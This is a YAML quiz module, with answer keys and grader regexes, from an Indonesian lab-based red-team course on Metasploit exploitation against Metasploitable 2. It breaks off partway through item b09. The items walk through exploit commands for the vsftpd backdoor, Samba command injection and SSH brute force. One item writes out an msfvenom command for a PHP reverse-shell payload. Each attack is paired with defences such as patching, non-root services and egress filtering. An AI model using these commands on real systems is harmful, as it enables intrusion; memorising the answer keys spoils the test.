---
format: 1
id: rt-exploitation-metasploit
course:
  slug: redteam
  title: Red Team (Lab Pentest)
  description: Sisi ofensif dari DevSecOps — metodologi red team dipelajari di lab terisolasi milik sendiri (VirtualBox host-only, Kali Linux + Metasploitable 2) untuk memahami cara penyerang bekerja dan membangun pertahanannya (purple team). Recon, enumerasi, analisis kerentanan, eksploitasi, post-exploitation, dan pelaporan. SEMUA hanya pada target milik sendiri dengan izin; teknik dipetakan ke kontrol pertahanan di board DevSecOps.
title: Eksploitasi dengan Metasploit
summary: "Mengubah kerentanan prioritas (modul 04) menjadi akses nyata. Modul ini mengajarkan alur Metasploit Framework: msfconsole, search → use → set opsi (RHOSTS/LHOST/PAYLOAD) → show options → exploit, lalu mengelola sesi/shell. Dibuktikan pada servis rentan Metasploitable (vsftpd 2.3.4 backdoor, Samba usermap CVE-2007-2447, UnrealIRCd), plus beda bind vs reverse shell. Dijalankan learner di Kali/VirtualBox; tiap eksploitasi dipetakan ke pertahanan blue (patch, non-root, egress, deteksi)."
order: 5
version: 1
status: draft
updated: '2026-11-26'
tested_on:
  - 'Modul ini DIDOKUMENTASIKAN dari alur Metasploit standar — perintah & exploit dijalankan learner di Kali + Metasploitable 2, BUKAN dieksekusi penulis (status draft; penulis tidak menjalankan exploit di environment ini)'
  - 'Servis & kerentanan yang dirujuk adalah kerentanan terdokumentasi Metasploitable 2 (Rapid7)'
  - Semua pada target milik sendiri di lab terisolasi; tiap teknik dipetakan ke pertahanan board DevSecOps
objectives:
  - id: msfworkflow
    text: Menguasai alur msfconsole (search/use/set/show options/exploit)
  - id: payloads
    text: Memilih payload & memahami bind vs reverse shell
  - id: exploit
    text: Mengeksploitasi servis rentan untuk mendapat akses
  - id: sessions
    text: Mengelola sesi & shell hasil eksploitasi
  - id: aux
    text: Memakai modul auxiliary (scanner/brute) di Metasploit
  - id: purple
    text: Memetakan tiap eksploitasi ke pertahanannya (blue)
sources:
  - title: Metasploit — dokumentasi resmi (Rapid7)
    url: https://docs.rapid7.com/metasploit/
  - title: Metasploit Unleashed (OffSec)
    url: https://www.offsec.com/metasploit-unleashed/
  - title: Metasploitable 2 — Exploiting (Rapid7)
    url: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
  - title: MITRE ATT&CK — Exploitation of Remote Services (T1210)
    url: https://attack.mitre.org/techniques/T1210/
  - title: MITRE ATT&CK — Exploit Public-Facing Application (T1190)
    url: https://attack.mitre.org/techniques/T1190/
questions:
  # ---------------------------------------------------------------- Tier A
  - id: a01
    tier: A
    type: command
    objective: msfworkflow
    prompt: Jalankan konsol Metasploit Framework dari terminal Kali.
    answers: ['msfconsole']
    patterns: ['^msfconsole([ \t]|$)']
    tests:
      pass:
        - 'msfconsole'
        - 'msfconsole -q'
      fail:
        - 'metasploit'
        - 'msf'
        - 'msfvenom'
    explanation: '`msfconsole` membuka antarmuka utama Metasploit Framework — platform eksploitasi paling populer. `-q` (quiet) melewati banner. Di dalamnya kamu `search`, `use`, `set`, `exploit`. Metasploit membungkus exploit jadi modul terstandar sehingga kamu tak perlu menulis/menyesuaikan kode exploit mentah (meski itu tetap skill berharga, modul 04). Pertama kali, jalankan `db_status` untuk cek koneksi database (menyimpan host/servis/loot — modul 02 b08). Metasploit = recon (auxiliary) + eksploitasi (exploit) + post-ex (post) + payload dalam satu framework. Ini alat utama modul ini.'
    source: https://docs.rapid7.com/metasploit/

  - id: a02
    tier: A
    type: command
    objective: msfworkflow
    prompt: Di dalam msfconsole, pilih modul exploit backdoor vsftpd 2.3.4 untuk dipakai.
    answers: ['use exploit/unix/ftp/vsftpd_234_backdoor']
    patterns: ['^use[ \t]+\S*vsftpd_234_backdoor', '^use[ \t]+exploit/\S+vsftpd']
    tests:
      pass:
        - 'use exploit/unix/ftp/vsftpd_234_backdoor'
        - 'use exploit/unix/ftp/vsftpd_234_backdoor'
      fail:
        - 'exploit vsftpd'
        - 'run vsftpd_234_backdoor'
        - 'search vsftpd'
    explanation: '`use <path-modul>` memilih modul yang akan dipakai. `use exploit/unix/ftp/vsftpd_234_backdoor` memuat exploit untuk backdoor vsftpd 2.3.4 (ditemukan via `search vsftpd`, modul 04). Setelah `use`, prompt berubah menunjukkan modul aktif, dan opsi modul tersedia untuk di-`set`. Kamu bisa `use` dengan path lengkap atau nomor dari hasil `search`. Exploit ini memicu backdoor di vsftpd 2.3.4 yang membuka shell — salah satu "low-hanging fruit" Metasploitable (modul 04). Alur selalu: `search` → `use` → `show options` → `set` → `exploit`.'
    source: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/

  - id: a03
    tier: A
    type: command
    objective: msfworkflow
    prompt: Lihat opsi yang perlu/bisa dikonfigurasi untuk modul yang sedang dipakai.
    answers: ['show options']
    patterns: ['^show[ \t]+options([ \t]|$)', '^options([ \t]|$)']
    tests:
      pass:
        - 'show options'
        - 'options'
      fail:
        - 'show modules'
        - 'set options'
        - 'exploit'
    explanation: '`show options` menampilkan parameter modul: mana yang **Required** (wajib di-set, mis. `RHOSTS` = target) dan mana yang punya default. Selalu cek ini sebelum `exploit` — modul yang kekurangan opsi wajib akan gagal. Kolom menunjukkan nama, nilai saat ini, required (yes/no), dan deskripsi. Opsi umum: `RHOSTS`/`RPORT` (target), `LHOST`/`LPORT` (listener untuk reverse shell, a06), `PAYLOAD`. `show payloads` menampilkan payload yang kompatibel; `show targets` menampilkan varian target. Membaca opsi = memahami apa yang dibutuhkan exploit agar berhasil & tidak menebak-nebak.'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: a04
    tier: A
    type: command
    objective: msfworkflow
    prompt: Set alamat target (RHOSTS) exploit ke `192.168.56.101`.
    answers: ['set RHOSTS 192.168.56.101']
    patterns: ['^set[ \t]+RHOSTS[ \t]+192\.168\.56\.101', '^set[ \t]+RHOSTS?[ \t]+\S+']
    tests:
      pass:
        - 'set RHOSTS 192.168.56.101'
        - 'set RHOST 192.168.56.101'
      fail:
        - 'RHOSTS 192.168.56.101'
        - 'set target 192.168.56.101'
        - 'set LHOST 192.168.56.101'
    explanation: '`set RHOSTS <ip>` menetapkan target (Remote HOSTS). Di Metasploit, `RHOSTS` (jamak, bisa range/file) adalah target serangan, `RPORT` port-nya (sering sudah default sesuai servis). Jangan tertukar dengan `LHOST`/`LPORT` yang adalah mesin KAMU (listener untuk reverse shell, a06). Jika kamu mengimpor scan (`db_import`, modul 02), `RHOSTS` bisa di-set dari database. `setg` menetapkan secara global (berlaku lintas modul — praktis untuk target yang sama). Salah set RHOSTS vs LHOST adalah kesalahan pemula klasik yang membuat exploit "berhasil" tapi shell tak pernah datang.'
    source: https://docs.rapid7.com/metasploit/

  - id: a05
    tier: A
    type: command
    objective: exploit
    prompt: Jalankan exploit yang sudah dikonfigurasi terhadap target.
    answers: ['exploit']
    patterns: ['^exploit([ \t]|$)', '^run([ \t]|$)']
    tests:
      pass:
        - 'exploit'
        - 'run'
        - 'exploit -j'
      fail:
        - 'start'
        - 'attack'
        - 'go'
    explanation: '`exploit` (atau alias `run`) menjalankan modul terhadap target dengan opsi yang sudah di-set. Jika berhasil, kamu mendapat **sesi** — shell atau Meterpreter (a07/modul 08). `exploit -j` menjalankannya sebagai background job (berguna untuk multi-target atau handler yang menunggu koneksi). Sebelum menekan ini: pastikan `show options` lengkap, payload sesuai (a06), dan kamu di scope (modul 01). Jika gagal, cek: versi/target cocok? (modul 04 a10), payload benar?, listener (LHOST) terjangkau target?, firewall? Keberhasilan `exploit` = transisi dari "berpotensi rentan" ke "confirmed access" (modul 04 a13).'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: a06
    tier: A
    type: text
    objective: payloads
    prompt: Apa beda "reverse shell" dan "bind shell" sebagai payload?
    answers: ['reverse: target menghubungi balik ke mesin penyerang (lolos firewall outbound); bind: target membuka port & penyerang menghubunginya (sering diblokir firewall inbound)']
    patterns: ['reverse[^\n]*(target|korban)[^\n]*(hubungi|connect|balik|menghubungi)[^\n]*(penyerang|attacker|kita)', 'bind[^\n]*(target|korban)[^\n]*(buka|listen|port)[^\n]*(penyerang (hubungi|connect))?', '(firewall|outbound|inbound)[^\n]*(lolos|diblokir)']
    tests:
      fail: ['keduanya sama', 'reverse shell lebih lambat saja', 'bind shell tidak butuh port', 'tidak ada bedanya']
    explanation: '**Reverse shell**: target **menghubungi balik** ke mesin penyerang (`LHOST:LPORT`) — penyerang menjalankan listener/handler, target "menelepon pulang". Lolos firewall yang memblokir inbound tapi mengizinkan outbound (umum). **Bind shell**: target **membuka port & mendengarkan**, penyerang menghubunginya — sering diblokir firewall inbound di target. Reverse lebih umum dipakai karena firewall biasanya lebih longgar ke outbound. Inilah kenapa `LHOST` (IP penyerang) wajib di-set untuk reverse payload. Pelajaran blue (board DevSecOps modul 01/08): **batasi egress** (reverse shell butuh target bisa menelepon keluar — egress deny menggagalkannya) dan inbound (bind shell).'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: a07
    tier: A
    type: command
    objective: sessions
    prompt: Daftar semua sesi aktif hasil eksploitasi di msfconsole.
    answers: ['sessions -l']
    patterns: ['^sessions[ \t]+-l([ \t]|$)', '^sessions([ \t]|$)']
    tests:
      pass:
        - 'sessions -l'
        - 'sessions'
        - 'sessions -i 1'
      fail:
        - 'show sessions'
        - 'list sessions'
        - 'ps'
    explanation: '`sessions -l` (atau `sessions`) mendaftar sesi aktif — tiap shell/Meterpreter yang kamu dapat diberi nomor. `sessions -i <id>` berinteraksi (masuk) ke sesi tertentu. Berguna saat kamu punya banyak akses (multi-target/multi-exploit): kamu bisa background satu sesi (`Ctrl+Z`/`background`), buka yang lain, lalu kembali. Sesi Meterpreter (modul 08) lebih kaya dari shell biasa. `sessions -u <id>` upgrade shell biasa ke Meterpreter. Mengelola sesi = mengelola akses yang didapat — fondasi post-exploitation. Di laporan, tiap sesi = bukti "confirmed access".'
    source: https://docs.rapid7.com/metasploit/

  - id: a08
    tier: A
    type: command
    objective: aux
    prompt: Pakai modul auxiliary Metasploit untuk brute-force login SSH (bukan exploit, tapi scanner login).
    answers: ['use auxiliary/scanner/ssh/ssh_login']
    patterns: ['^use[ \t]+\S*auxiliary/scanner/ssh/ssh_login', '^use[ \t]+auxiliary/\S+ssh']
    tests:
      pass:
        - 'use auxiliary/scanner/ssh/ssh_login'
        - 'use auxiliary/scanner/ssh/ssh_login'
      fail:
        - 'use exploit/ssh'
        - 'hydra ssh'
        - 'ssh_login'
    explanation: 'Modul **auxiliary** di Metasploit melakukan scanning, enumerasi, dan brute force — bukan eksploitasi memori. `auxiliary/scanner/ssh/ssh_login` mencoba kredensial (set `USERNAME`/`PASS_FILE` atau `USERPASS_FILE`) terhadap SSH — berguna dengan daftar user hasil enumerasi (modul 03) + password umum. Serupa untuk `ftp_login`, `mysql_login`, `smb_login`. Jika berhasil, Metasploit bisa langsung membuka sesi. Alternatif di luar msf: Hydra (modul 07). Ini menunjukkan Metasploit bukan cuma exploit — ia platform lengkap. Sisi blue (board DevSecOps modul 03): brute ini dilawan fail2ban, MaxAuthTries, key-only auth, MFA.'
    source: https://docs.rapid7.com/metasploit/

  - id: a09
    tier: A
    type: text
    objective: exploit
    prompt: Banyak servis rentan di Metasploitable berjalan sebagai root, sehingga RCE langsung memberi shell root. Apa pelajaran blue dari fakta ini?
    answers: ['jalankan servis sebagai non-root/least privilege agar kompromi servis tidak langsung = root; perkecil blast radius']
    patterns: ['(non-?root|least privilege|user (biasa|terbatas))[^\n]*(servis|jalankan)', '(kompromi|rce|jebol)[^\n]*(servis)[^\n]*(bukan|tidak)[^\n]*(root|langsung)', 'blast radius|perkecil (dampak|hak)']
    tests:
      fail: ['servis harus selalu root', 'tidak ada pelajaran', 'root lebih aman', 'non-root tidak membantu']
    explanation: 'Di Metasploitable banyak servis berjalan sebagai **root**, jadi RCE lewat servis = shell **root langsung** (melewati privilege escalation, modul 08). Pelajaran blue terbesar (board DevSecOps modul 06): **jalankan servis sebagai non-root / least privilege**. Kalau servis web/FTP berjalan sebagai user terbatas, RCE hanya memberi penyerang user itu — bukan kontrol penuh host. Ini mengubah "satu RCE = game over" jadi "satu RCE = pijakan terbatas yang masih harus dieskalasi" (dan eskalasi bisa gagal/terdeteksi). Least privilege + perkecil blast radius adalah tema berulang: ia tak mencegah kompromi awal, tapi membatasi dampaknya secara dramatis.'
    source: https://attack.mitre.org/techniques/T1210/

  - id: a10
    tier: A
    type: command
    objective: msfworkflow
    prompt: Masuk/berinteraksi dengan sesi nomor 1 yang sudah terbuka.
    answers: ['sessions -i 1']
    patterns: ['^sessions[ \t]+-i[ \t]+[0-9]+']
    tests:
      pass:
        - 'sessions -i 1'
        - 'sessions -i 1'
      fail:
        - 'sessions 1'
        - 'session -i 1'
        - 'interact 1'
    explanation: '`sessions -i <id>` ("interact") masuk ke sesi tertentu — kamu mendapat shell/Meterpreter di target itu. Setelah masuk, jalankan perintah di target (`whoami`, `id`, `uname -a` untuk konfirmasi akses & OS). Untuk keluar tanpa menutup sesi: `background` atau `Ctrl+Z` (kembali ke msfconsole, sesi tetap hidup). `sessions -k <id>` menutup sesi. Mengelola beberapa sesi (dari beberapa exploit/target) rapi adalah bagian engagement nyata. Perintah pertama yang bijak setelah masuk: `id`/`whoami` — konfirmasi SIAPA kamu (root? user?) menentukan langkah berikutnya (post-ex/privesc, modul 08).'
    source: https://docs.rapid7.com/metasploit/

  - id: a11
    tier: A
    type: text
    objective: exploit
    prompt: Samba di Metasploitable rentan "usermap_script" (CVE-2007-2447). Jenis kerentanan apa ini secara umum?
    answers: ['command injection — input (username) tak di-sanitasi dieksekusi sebagai perintah shell oleh samba → rce']
    patterns: ['command injection|injeksi perintah', '(input|username)[^\n]*(tak|tidak)[^\n]*(sanitasi|validasi)[^\n]*(perintah|shell|eksekusi)', 'rce[^\n]*(input|username|perintah)']
    tests:
      fail: ['buffer overflow', 'sql injection', 'xss', 'tidak ada kerentanan']
    explanation: 'CVE-2007-2447 (Samba "usermap_script") adalah **command injection**: Samba yang dikonfigurasi dengan `username map script` meneruskan username ke shell tanpa sanitasi — username berisi metakarakter shell (mis. `/=\`cmd\``) dieksekusi sebagai perintah → RCE sebagai root. Ini kelas yang sama dengan injection di board DevSecOps modul 07 (data tak tepercaya jadi kode). Exploit msf: `exploit/multi/samba/usermap_script`. Pelajaran blue: akarnya identik dengan SQLi/OS command injection — **jangan pernah meneruskan input tak tepercaya ke interpreter/shell** (sanitasi, API berargumen). Rentang kerentanan di servis sama dengan di aplikasi web — pola yang sama berulang.'
    source: https://attack.mitre.org/techniques/T1210/

  - id: a12
    tier: A
    type: command
    objective: payloads
    prompt: Set payload reverse shell dan arahkan listener ke IP Kali-mu (LHOST `192.168.56.1`).
    answers: ['set LHOST 192.168.56.1']
    patterns: ['^set[ \t]+LHOST[ \t]+\S+', '^setg[ \t]+LHOST[ \t]+\S+']
    tests:
      pass:
        - 'set LHOST 192.168.56.1'
        - 'set LHOST 192.168.56.1'
      fail:
        - 'set RHOST 192.168.56.1'
        - 'set LHOST'
        - 'LHOST 192.168.56.1'
    explanation: '`set LHOST <ip-kali>` menetapkan IP listener untuk **reverse shell** — ke mana target akan "menelepon pulang" (a06). Ini IP MESIN KAMU (Kali) di subnet lab, BUKAN target (`RHOSTS`). `set LPORT` opsional (port listener, default sering 4444). Payload reverse dipilih dengan `set PAYLOAD <...reverse_tcp>` (mis. `linux/x86/meterpreter/reverse_tcp`). Kesalahan umum: LHOST salah (IP yang tak bisa dijangkau target) → exploit "jalan" tapi shell tak pernah datang. Pastikan target bisa menjangkau LHOST (uji ping/route). Sisi blue (board DevSecOps): egress yang dibatasi mencegah target menjangkau LHOST = reverse shell gagal.'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: a13
    tier: A
    type: text
    objective: sessions
    prompt: Perintah pertama yang bijak dijalankan tepat setelah mendapat shell di target adalah?
    answers: ['id / whoami (dan uname -a) untuk tahu siapa kamu & OS — menentukan langkah berikutnya']
    patterns: ['\bid\b|whoami', 'uname|hostname', '(tahu|cek|konfirmasi)[^\n]*(siapa|user|hak|root|os)']
    tests:
      fail: ['langsung reboot target', 'hapus semua file', 'rm -rf', 'matikan jaringan']
    explanation: 'Begitu dapat shell, orientasi dulu: `id`/`whoami` (siapa kamu — root atau user biasa? menentukan apakah perlu privilege escalation, modul 08), `uname -a` (kernel/OS → exploit privesc yang cocok), `hostname`, `ip addr` (di mana kamu di jaringan → pivot?). Jangan langsung bertindak destruktif (do no harm, modul 01) — tujuanmu membuktikan akses & dampak, bukan merusak. Shell awal sering tidak stabil/terbatas ("dumb shell") — "upgrade" ke shell penuh (`python -c pty`) atau Meterpreter (`sessions -u`) untuk kenyamanan. Orientasi yang tenang > tindakan gegabah. Catat akses ini sebagai bukti (laporan, modul 10).'
    source: https://docs.rapid7.com/metasploit/

  - id: a14
    tier: A
    type: command
    objective: aux
    prompt: Cari versi SMB target dengan modul auxiliary scanner Metasploit.
    answers: ['use auxiliary/scanner/smb/smb_version']
    patterns: ['^use[ \t]+\S*auxiliary/scanner/smb/smb_version', '^use[ \t]+auxiliary/scanner/smb/\S+']
    tests:
      pass:
        - 'use auxiliary/scanner/smb/smb_version'
        - 'use auxiliary/scanner/smb/smb_version'
      fail:
        - 'use exploit/smb'
        - 'smb_version'
        - 'nmap -sV'
    explanation: '`auxiliary/scanner/smb/smb_version` mendeteksi versi SMB/Samba target dari dalam Metasploit — berguna untuk mengonfirmasi versi sebelum memilih exploit (modul 04: cocokkan versi). Metasploit punya banyak auxiliary scanner (`smb_enumshares`, `ssh_version`, `http_version`, `mysql_version`) yang menyatukan recon & eksploitasi dalam satu alur + database. Set `RHOSTS` lalu `run`. Hasilnya tersimpan di db msf (`services`). Ini melengkapi nmap (modul 02) — kadang lebih praktis saat sudah di dalam msf. Mengonfirmasi versi via scanner mengurangi risiko menjalankan exploit yang tak cocok (modul 04 a10).'
    source: https://docs.rapid7.com/metasploit/

  - id: a15
    tier: A
    type: text
    objective: purple
    prompt: Secara umum, bagaimana blue team mencegah/mendeteksi eksploitasi servis seperti ini?
    answers: ['patch/upgrade servis usang (tutup kerentanan), non-root + hardening, batasi egress (gagalkan reverse shell), dan deteksi runtime/log (shell/koneksi tak terduga)']
    patterns: ['patch|upgrade[^\n]*(servis|versi|usang)', '(non-?root|least privilege|hardening)', '(batasi|deny)[^\n]*egress|(deteksi|runtime|falco|log)[^\n]*(shell|koneksi|exploit)']
    tests:
      fail: ['eksploitasi tidak bisa dicegah', 'biarkan servis usang', 'tidak ada pertahanan', 'root lebih aman']
    explanation: 'Pertahanan berlapis terhadap eksploitasi servis (peta ke board DevSecOps): **(1) Patch/upgrade** servis usang → tutup kerentanannya (modul 05 blue — n-day, modul 04 b13). **(2) Non-root + hardening** → kalaupun jebol, dampak terbatas (modul 06). **(3) Batasi egress** → reverse shell tak bisa menelepon pulang (modul 01/08). **(4) Deteksi runtime & log** → shell baru di servis, koneksi keluar tak terduga, proses anomali = IOC (modul 09 — Falco/auditd). **(5) Segmentasi** → batasi lateral. Tak ada satu kontrol cukup; berlapis memberi banyak titik gagal bagi penyerang & banyak peluang deteksi bagi blue. Inilah inti purple: tiap exploit red memetakan ke tumpukan pertahanan ini.'
    source: https://attack.mitre.org/techniques/T1210/

  # ---------------------------------------------------------------- Tier B
  - id: b01
    tier: B
    type: command
    objective: payloads
    prompt: Lihat daftar payload yang kompatibel dengan exploit yang sedang dipakai.
    answers: ['show payloads']
    patterns: ['^show[ \t]+payloads([ \t]|$)']
    tests:
      pass:
        - 'show payloads'
        - 'show payloads'
      fail:
        - 'show options'
        - 'payloads'
        - 'set payload'
    explanation: '`show payloads` menampilkan payload yang kompatibel dengan exploit & target aktif. Payload = kode yang dijalankan di target setelah exploit berhasil: shell command (`cmd/unix/reverse`), Meterpreter (`.../meterpreter/reverse_tcp` — lebih kaya, modul 08), bind vs reverse (a06). Pilih dengan `set PAYLOAD <nama>`. Kompatibilitas penting: payload harus cocok OS/arsitektur target (modul 04 a10). Meterpreter dipilih bila ingin fitur post-ex lengkap; shell sederhana bila ingin ringan/stabil. `show targets` (varian target) & `show advanced` (opsi lanjut) melengkapi. Memahami payload = memahami "apa yang terjadi SETELAH masuk".'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: b02
    tier: B
    type: text
    objective: msfworkflow
    prompt: Mengapa mengimpor hasil nmap (db_import) & memakai database Metasploit mempermulus eksploitasi?
    answers: ['host/servis tersimpan & bisa dikueri (hosts/services), RHOSTS bisa di-set dari db, dan loot/kredensial terkumpul rapi — hemat ketik ulang & terorganisir']
    patterns: ['(host|servis|services|hosts)[^\n]*(tersimpan|database|db|dikueri)', 'rhosts[^\n]*(dari )?db|set[^\n]*(dari )?database', '(loot|kredensial)[^\n]*(terkumpul|rapi|db)|hemat ketik']
    tests:
      fail: ['database tidak berguna', 'harus ketik ulang semua', 'metasploit tanpa database lebih baik', 'tidak ada manfaat']
    explanation: 'Database Metasploit (`db_import scan.xml` dari modul 02, lalu `hosts`/`services`/`vulns`) membuat eksploitasi mulus: target & servis sudah tersimpan (tak perlu ketik ulang IP/port), `set RHOSTS` bisa merujuk db, kredensial & loot yang didapat terkumpul (`creds`, `loot`), dan `workspace` memisahkan per-engagement. Di satu target kecil manfaatnya kecil, tapi di banyak host ini menjaga keteraturan & kecepatan. Terorganisir sejak recon (modul 02/04) → efisien di eksploitasi → mudah di-laporkan (modul 10). Cek `db_status` di awal. Ini mengubah Metasploit dari "jalankan exploit satu-satu" jadi "platform engagement terkelola".'
    source: https://docs.rapid7.com/metasploit/

  - id: b03
    tier: B
    type: text
    objective: exploit
    prompt: Exploit kamu "berhasil" (tidak error) tapi tidak ada sesi yang terbuka. Sebutkan dua kemungkinan penyebab.
    answers: ['lhost salah/tak terjangkau target (reverse shell tak sampai), payload tak cocok OS/arsitektur, atau firewall memblokir koneksi balik']
    patterns: ['lhost[^\n]*(salah|tak terjangkau|tidak (bisa|sampai))', 'payload[^\n]*(tak cocok|salah)[^\n]*(os|arsitektur|target)', 'firewall[^\n]*(blokir|cegah)[^\n]*(koneksi|balik|reverse)']
    tests:
      fail: ['selalu karena target mati', 'exploit tidak pernah gagal diam', 'tidak ada penyebab', 'pasti karena msfconsole rusak']
    explanation: 'Exploit "berhasil tanpa error" tapi tak ada sesi — penyebab umum: **(1) LHOST salah/tak terjangkau** — target tak bisa menelepon balik (reverse shell), sering karena IP LHOST keliru atau target & Kali beda subnet. **(2) Payload tak cocok** OS/arsitektur target (modul 04 a10) → payload crash saat jalan. **(3) Firewall** memblokir koneksi balik (egress target / inbound Kali). **(4) Exploit sebenarnya gagal** diam-diam (versi tak persis cocok, b04 modul 04). Cek: `set LHOST` benar & bisa di-ping dari target?, payload cocok?, `exploit -j` + `sessions`?, coba bind shell bila reverse gagal. Debugging ini normal — eksploitasi jarang mulus di percobaan pertama.'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: b04
    tier: B
    type: command
    objective: aux
    prompt: Set daftar file kombinasi user:password untuk modul brute SSH (USERPASS_FILE) ke `creds.txt`.
    answers: ['set USERPASS_FILE creds.txt']
    patterns: ['^set[ \t]+USERPASS_FILE[ \t]+\S+', '^set[ \t]+(USER_FILE|PASS_FILE)[ \t]+\S+']
    tests:
      pass:
        - 'set USERPASS_FILE creds.txt'
        - 'set USER_FILE users.txt'
      fail:
        - 'set PASSWORD creds.txt'
        - 'USERPASS_FILE creds.txt'
        - 'set RHOSTS creds.txt'
    explanation: 'Modul brute (mis. `ssh_login`, a08) menerima daftar: `USER_FILE` (daftar user), `PASS_FILE` (daftar password), atau `USERPASS_FILE` (pasangan `user:pass` per baris). Isi dari enumerasi (modul 03: user valid) + wordlist password (rockyou, dll). Set lalu `run`. Metasploit mencoba tiap kombinasi & melaporkan yang berhasil (bisa langsung buka sesi). Catatan: brute itu berisik & memicu lockout/deteksi (board DevSecOps modul 03/09) — password spraying (modul 03 b06) lebih halus. Alternatif di luar msf: Hydra (modul 07, lebih fleksibel). Kualitas wordlist & daftar user menentukan keberhasilan — enumerasi yang baik (modul 03) membuat brute terarah.'
    source: https://docs.rapid7.com/metasploit/

  - id: b05
    tier: B
    type: text
    objective: payloads
    prompt: Apa itu msfvenom, dan kapan dipakai (di luar modul exploit msfconsole)?
    answers: ['generator payload standalone — membuat file payload (exe/elf/php/dll) untuk dikirim/diunggah ke target di luar alur exploit otomatis']
    patterns: ['(generator|pembuat|buat)[^\n]*payload', '(file|standalone)[^\n]*(exe|elf|php|apk|dll|payload)', '(kirim|unggah|upload|tanam)[^\n]*(payload|target)[^\n]*(di luar|manual)?']
    tests:
      fail: ['msfvenom adalah scanner', 'sama dengan nmap', 'untuk enkripsi disk', 'tidak menghasilkan payload']
    explanation: '`msfvenom` adalah generator payload standalone Metasploit — membuat **file payload** (`.exe`, `.elf`, `.php`, `.apk`, `.war`, shellcode) yang bisa kamu **kirim/unggah sendiri** ke target di luar alur exploit otomatis msfconsole. Contoh: `msfvenom -p php/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f raw > shell.php`, lalu unggah via upload form rentan (modul 06) atau share writable (modul 03), jalankan, tangkap dengan handler msf. Dipakai ketika tak ada exploit memori tapi kamu punya cara menaruh & menjalankan file (upload, command injection, SMB). Sisi blue (board DevSecOps modul 07): validasi upload, non-exec direktori upload, AV/EDR, egress deny — menggagalkan payload yang diunggah.'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: b06
    tier: B
    type: text
    objective: exploit
    prompt: UnrealIRCd 3.2.8.1 di Metasploitable punya backdoor. Apa persamaan konseptual dengan backdoor vsftpd 2.3.4?
    answers: ['keduanya backdoor supply-chain: kode jahat disusupkan ke rilis software asli di server distribusi, memicu shell saat trigger tertentu']
    patterns: ['(backdoor|kode jahat)[^\n]*(disusupkan|ditanam|supply.?chain|rilis|distribusi)', 'supply.?chain', '(rilis|source|distribusi) (asli|resmi)[^\n]*(dikompromi|disusupi|ditanami)']
    tests:
      fail: ['tidak ada persamaan', 'keduanya buffer overflow', 'keduanya sql injection', 'backdoor tumbuh sendiri']
    explanation: 'vsftpd 2.3.4 DAN UnrealIRCd 3.2.8.1 sama-sama **backdoor supply-chain**: penyerang mengompromikan **server distribusi** software dan menyisipkan kode jahat ke rilis "asli" — pengguna yang mengunduh mendapat versi ber-backdoor tanpa sadar (memicu shell saat trigger tertentu). Ini contoh **Supply Chain Compromise** (ATT&CK T1195) dalam sejarah nyata, dan persis ancaman yang board DevSecOps modul 05/11 lawan: verifikasi integritas (checksum, signing/cosign), pin digest, SBOM. Pelajaran: kamu tak hanya khawatir kerentanan DI software, tapi juga apakah software itu sendiri tepercaya (asal-usulnya). Backdoor ini mengajarkan supply-chain security dari sisi "apa jadinya kalau gagal".'
    source: https://attack.mitre.org/techniques/T1210/

  - id: b07
    tier: B
    type: text
    objective: sessions
    prompt: Mengapa shell awal sering perlu "di-upgrade" (ke PTY/Meterpreter), dan apa manfaatnya?
    answers: ['shell awal sering tidak stabil/terbatas (tanpa tab-complete, job control, interaktif); upgrade memberi shell penuh/fitur post-ex yang stabil']
    patterns: ['shell awal[^\n]*(tidak stabil|terbatas|dumb|mentah)', '(upgrade|tingkatkan)[^\n]*(pty|meterpreter|shell penuh)', '(stabil|interaktif|tab|job control|fitur)[^\n]*(shell|post)']
    tests:
      fail: ['shell awal selalu sempurna', 'upgrade tidak berguna', 'shell tidak bisa di-upgrade', 'semua shell sama']
    explanation: 'Shell awal dari exploit sering "dumb shell": tak stabil (mudah mati), tanpa tab-complete, job control (`Ctrl+C` membunuh sesi!), atau interaktivitas penuh (perintah seperti `sudo`/`ssh` yang butuh TTY gagal). "Upgrade" memperbaikinya: memakai Python pty.spawn untuk /bin/bash plus trik stty (PTY penuh), atau `sessions -u <id>` untuk jadikan Meterpreter (fitur post-ex kaya: upload/download, pivot, hashdump — modul 08). Manfaat: bekerja nyaman & stabil, dan membuka kemampuan lanjut. Langkah kecil tapi penting sebelum post-exploitation serius. Shell yang stabil = kerja efisien, bukan berjuang melawan terminal yang rusak.'
    source: https://www.offsec.com/metasploit-unleashed/

  - id: b08
    tier: B
    type: text
    objective: purple
    prompt: Reverse shell butuh target menghubungi keluar ke penyerang. Kontrol jaringan apa yang paling efektif menggagalkannya?
    answers: ['egress filtering / default-deny outbound — target tak boleh membuka koneksi keluar sembarangan, jadi reverse shell tak bisa menelepon pulang']
    patterns: ['egress[^\n]*(filter|deny|batasi|kontrol)', '(default-?deny|batasi|blokir)[^\n]*(outbound|keluar)', '(target|server)[^\n]*(tak bisa|tidak boleh)[^\n]*(keluar|outbound|menelepon)']
    tests:
      fail: ['tidak ada kontrol efektif', 'hanya blokir inbound', 'egress tidak relevan', 'reverse shell tak bisa dicegah']
    explanation: 'Reverse shell mengandalkan target **membuka koneksi keluar** ke penyerang (a06/a12). **Egress filtering / default-deny outbound** menggagalkannya: jika server hanya boleh keluar ke tujuan yang diizinkan (mis. update server tertentu) dan sisanya diblokir, payload tak bisa menelepon pulang → exploit "berhasil" tapi tak ada sesi. Ini salah satu kontrol paling berdampak & paling sering terlupa (board DevSecOps modul 01: `--internal`/egress deny; modul 08 availability jaringan). Banyak org ketat di inbound tapi membiarkan outbound bebas — celah besar. Egress deny juga menghentikan C2, exfiltrasi, dan unduhan tool (modul 12 capstone b09). Pertahanan dua-arah.'
    source: https://attack.mitre.org/techniques/T1210/

  - id: b09
    tier: B
    type: command
    objective: msfworkflow
    prompt: Set opsi global agar LHOST berlaku di semua modul tanpa set ulang tiap kali.
    answers: ['setg LHOST 192.168.56.1']
    patterns: ['^setg[ \t]+LHOST[ \t]+\S+', '^setg[ \t]+\S+[ \t]+\S+']
    tests:
      pass:
        - 'setg LHOST 192.168.56.1'
        - 'setg RHOSTS 192.168.56.101'
